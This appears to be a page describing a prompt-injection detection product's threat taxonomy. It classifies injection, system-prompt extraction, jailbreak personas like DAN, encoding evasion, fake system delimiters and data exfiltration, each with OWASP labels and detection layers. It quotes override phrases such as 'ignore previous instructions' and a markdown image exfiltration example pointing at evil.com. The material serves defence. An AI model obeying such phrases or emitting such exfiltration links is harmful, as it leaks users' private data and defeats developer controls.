Threat Taxonomy & Attack Classification

Comprehensive coverage against known adversarial prompt engineering strategies and exploits.

Direct Prompt Injection
OWASP LLM01: Prompt Injection
HIGH (30)

Direct attempts to hijack or redirect the LLM execution flow away from developer instructions via adversarial phrases like "ignore previous instructions".

Layers: Regex Signatures + Semantic AI
System Prompt Extraction
OWASP LLM07: System Leakage
CRITICAL (35)

Attempts to extract internal system personas, confidential preambles, and guardrail rules via commands like "reveal your initial instructions".

Layers: Regex Signatures + Semantic AI
Jailbreak & Persona Override
OWASP LLM01: Jailbreak
CRITICAL (40)

Coercing the model into unconstrained roleplay modes (e.g. DAN, Developer Mode, Alpha Persona) designed to bypass ethical and safety barriers.

Layers: Heuristics + Regex + Semantic AI
Encoding & Obfuscation
OWASP LLM01: Evasion
HIGH (15)

Hiding adversarial payloads using Base64, Hexadecimal, ROT13, or zero-width invisible Unicode characters to evade lexical filters.

Layers: Heuristic De-obfuscation Engine
Instruction Override
OWASP LLM01: Injection
HIGH (25)

Synthetic system delimiters (e.g. <SYS>, [INST], --- END OF CONTEXT ---) inserted into user prompts to deceive parser context.

Layers: Delimiter Parser + Regex
Data Exfiltration
OWASP LLM02: Sensitive Leakage
CRITICAL (35)

Embedding markdown image tags or webhook URLs (e.g. ![img](https://evil.com?data=...)) designed to exfiltrate private conversation data.

Layers: URL & Markdown Exfil Parser
